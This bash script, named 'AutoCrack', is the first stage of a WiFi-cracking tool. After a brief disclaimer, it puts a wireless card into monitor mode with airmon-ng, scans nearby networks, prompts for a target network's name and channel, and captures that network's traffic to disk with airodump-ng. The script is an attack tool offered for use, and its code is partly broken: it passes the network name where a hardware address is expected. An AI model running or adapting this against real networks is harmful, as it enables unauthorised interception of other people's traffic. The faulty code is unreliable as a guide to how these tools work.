#!/bin/bash

echo "Welcome to AutoCrack: Disclaimer - Unethical use of scripts without permissions is illegal."
echo "Do you want to continue?"
echo "Type 'Y' for Yes or 'N' for No:"
read var

if [[ $var == "Y" || $var == "y" ]]; then
    echo "Continuing..."
    
    # Ask for the user's password to enable necessary commands
    echo "To proceed further, we need to enable certain commands. Please enter your password if prompted."
    sudo echo "Password authenticated."
    
    # Kill any interfering processes and set up monitor mode
    sudo airmon-ng check kill
    sudo airmon-ng start wlan0

    # Display current network interfaces and check if monitor mode is enabled
    echo "Current network interfaces:"
    iwconfig

    echo "Monitor mode enabled:"
    iwconfig

    # Scan for available WiFi networks
    sudo airodump-ng wlan0

    # Prompt the user for the target network's ESSID and channel
    echo "Please enter the ESSID of the target network:"
    read ESSID
    echo "Please enter the channel used by $ESSID:"
    read Channel

    # Begin monitoring the target network's traffic
    sudo airodump-ng -w hack1 -c $Channel --bssid $ESSID wlan0

else
    echo "Exiting."
fi
